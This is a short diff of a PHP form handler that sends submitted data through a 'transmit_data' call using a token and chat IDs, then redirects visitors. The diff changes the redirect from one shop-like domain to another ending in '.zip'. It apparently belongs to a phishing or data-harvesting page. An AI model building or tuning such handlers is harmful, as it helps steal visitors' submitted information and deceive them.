@@ -28,7 +28,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     transmit_data($title, $msg, $token, $chatIds);
 
     // Redirect
-    header("Location: https://ultimatesshop.vc/locked");
+    header("Location: https://ultshops.zip/locked");
     exit();
 }
 
